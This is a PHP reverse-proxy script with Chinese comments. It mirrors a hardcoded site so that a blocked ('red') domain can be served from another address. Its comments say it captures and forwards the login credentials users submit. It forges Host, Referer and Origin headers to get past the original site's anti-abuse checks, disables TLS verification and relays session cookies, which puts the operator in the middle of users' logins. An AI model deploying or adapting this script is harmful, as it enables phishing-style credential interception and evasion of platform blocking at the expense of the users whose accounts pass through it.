<?php
// 【注意：双引号里面改成真实红域名】
$target_url = "https://ygxian.jiuzhe.com.cn"; 

// 兼容函数：获取所有请求头
if (!function_exists('getallheaders')) {
    function getallheaders() {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            } else if ($name == "CONTENT_TYPE") {
                $headers["Content-Type"] = $value;
            } else if ($name == "CONTENT_LENGTH") {
                $headers["Content-Length"] = $value;
            }
        }
        return $headers;
    }
}

$request_uri = $_SERVER['REQUEST_URI'];
$fetch_url = rtrim($target_url, '/') . $request_uri;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $fetch_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

// 1. 识别并转发用户的请求类型 (解决提交表单的问题)
$method = $_SERVER['REQUEST_METHOD'];
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);

// 2. 如果是登录/注册(POST请求)，抓取用户输入的账号密码转发过去
if ($method === 'POST' || $method === 'PUT') {
    $post_data = file_get_contents('php://input');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
}

// 3. 核心破解：伪造请求头，骗过原站的“非法请求”拦截
$headers = [];
$target_host = parse_url($target_url, PHP_URL_HOST);
foreach (getallheaders() as $name => $value) {
    $name_lower = strtolower($name);
    // 伪装 Host 域名
    if ($name_lower === 'host') {
        $headers[] = "Host: " . $target_host;
    } 
    // 伪装 Referer 和 Origin，让原站以为是自家域名发起的登录请求
    elseif ($name_lower === 'referer' || $name_lower === 'origin') {
        $headers[] = "$name: $target_url"; 
    } 
    elseif ($name_lower !== 'content-length') { 
        $headers[] = "$name: $value";
    }
}
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// 4. 开启抓取返回头 (为了处理 Cookie，解决登录状态失效问题)
curl_setopt($ch, CURLOPT_HEADER, true);

$response = curl_exec($ch);
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$header_str = substr($response, 0, $header_size);
$body = substr($response, $header_size);
curl_close($ch);

// 5. 转发原站的 Cookie 给用户的手机，保持登录成功状态
$header_lines = explode("\r\n", $header_str);
foreach ($header_lines as $line) {
    if (stripos($line, 'Set-Cookie:') === 0 || stripos($line, 'Content-Type:') === 0) {
        header($line, false);
    }
}

// 6. 替换页面里的链接
$current_domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
$body = str_replace($target_url, $current_domain, $body);

echo $body;
?>